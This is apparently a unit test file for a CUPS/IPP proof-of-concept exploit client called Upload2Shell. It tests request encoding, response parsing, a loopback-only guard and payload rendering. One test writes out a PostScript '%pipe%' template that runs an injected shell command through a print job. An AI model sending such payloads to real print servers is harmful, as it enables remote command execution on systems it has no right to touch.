"""Unit tests for the Upload2Shell IPP client (no network, no target)."""
from __future__ import annotations

import io
import socket
import struct
import sys
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import cups_poc  # noqa: E402


class EscapingTests(unittest.TestCase):
    def test_ps_escape(self):
        self.assertEqual(cups_poc._esc(r"a\b(c)d"), r"a\\b\(c\)d")

    def test_sh_quote(self):
        self.assertEqual(cups_poc._sh_quote("a'b"), "'a'\\''b'")

    def test_loopback(self):
        self.assertTrue(cups_poc.is_loopback("127.0.0.1"))
        self.assertTrue(cups_poc.is_loopback("localhost"))
        self.assertTrue(cups_poc.is_loopback("::1"))
        self.assertFalse(cups_poc.is_loopback("10.0.0.1"))
        self.assertFalse(cups_poc.is_loopback("example.com"))


class IppEncodingTests(unittest.TestCase):
    def setUp(self):
        self.body = cups_poc.build_ipp(
            "ipp://127.0.0.1:631/printers/u2s", "anonymous", "job", b"DOC")

    def test_header(self):
        major, minor, op, req = struct.unpack(">BBHI", self.body[:8])
        self.assertEqual((major, minor), (2, 0))
        self.assertEqual(op, 0x0002)
        self.assertEqual(req, 1)

    def test_operation_group_tag(self):
        # First attribute must be preceded by the operation-attributes tag.
        self.assertEqual(self.body[8], 0x01)

    def test_document_appended(self):
        self.assertTrue(self.body.endswith(b"DOC"))

    def test_parses_back(self):
        # Our own request is not a response, but the attribute walk must work.
        parsed = cups_poc.parse_ipp(self.body)
        self.assertEqual(parsed["attributes"]["printer-uri"],
                         "ipp://127.0.0.1:631/printers/u2s")
        self.assertEqual(parsed["attributes"]["document-format"],
                         "application/postscript")


class IppParsingTests(unittest.TestCase):
    @staticmethod
    def _response(status=0x0000, job_id=7):
        attrs = (
            bytes([0x01])
            + bytes([0x47]) + struct.pack(">H", 18) + b"attributes-charset"
            + struct.pack(">H", 5) + b"utf-8"
            + bytes([0x21]) + struct.pack(">H", 6) + b"job-id"
            + struct.pack(">H", 4) + struct.pack(">i", job_id)
            + bytes([0x03])
        )
        return struct.pack(">BBHI", 2, 0, status, 1) + attrs

    def test_success(self):
        parsed = cups_poc.parse_ipp(self._response())
        self.assertEqual(parsed["status"], 0)
        self.assertEqual(parsed["attributes"]["job-id"], 7)

    def test_error(self):
        parsed = cups_poc.parse_ipp(self._response(status=0x0406))
        self.assertEqual(parsed["status"], 0x0406)

    def test_short(self):
        self.assertIn("error", cups_poc.parse_ipp(b"\x02\x00"))


class PayloadTests(unittest.TestCase):
    def test_render_replaces_command(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            tpl = Path(tmp) / "t.ps"
            tpl.write_text("{ (%pipe%__CMD__) (w) file } stopped")
            out = cups_poc.render_payload(tpl, "id > /tmp/x")
            self.assertIn(b"%pipe%id > /tmp/x", out)
            self.assertNotIn(b"__CMD__", out)

    def test_render_escapes(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            tpl = Path(tmp) / "t.ps"
            tpl.write_text("__CMD__")
            out = cups_poc.render_payload(tpl, "a(b)c")
            self.assertEqual(out, b"a\\(b\\)c")

    def test_missing_placeholder(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            tpl = Path(tmp) / "t.ps"
            tpl.write_text("no placeholder")
            with self.assertRaises(SystemExit):
                cups_poc.render_payload(tpl, "id")


class CliGuardTests(unittest.TestCase):
    def test_bad_target(self):
        with mock.patch("sys.stderr", io.StringIO()):
            self.assertEqual(cups_poc.main(["-t", "nohostport", "-q", "u2s"]), 2)

    def test_bad_port(self):
        with mock.patch("sys.stderr", io.StringIO()):
            self.assertEqual(cups_poc.main(["-t", "127.0.0.1:notaport"]), 2)

    def test_non_loopback_requires_authorized(self):
        err = io.StringIO()
        with mock.patch("sys.stderr", err):
            rc = cups_poc.main(["-t", "192.0.2.10:631", "-q", "u2s"])
        self.assertEqual(rc, 2)
        self.assertIn("authorized", err.getvalue())


class SubmitTests(unittest.TestCase):
    def test_submit_builds_request(self):
        captured = {}

        class FakeResp:
            status = 200

            def read(self):
                return IppParsingTests._response()

        class FakeConn:
            def __init__(self, host, port, timeout=30):
                captured["host"] = host
                captured["port"] = port

            def request(self, method, path, body=None, headers=None):
                captured["method"] = method
                captured["path"] = path
                captured["ctype"] = headers["Content-Type"]
                captured["body"] = body

            def getresponse(self):
                return FakeResp()

            def close(self):
                pass

        with mock.patch.object(cups_poc.http.client, "HTTPConnection", FakeConn):
            result = cups_poc.submit("127.0.0.1", 631, "u2s", b"DOC")

        self.assertEqual(captured["method"], "POST")
        self.assertEqual(captured["path"], "/printers/u2s")
        self.assertEqual(captured["ctype"], "application/ipp")
        self.assertEqual(result["status"], 0)


if __name__ == "__main__":
    unittest.main()
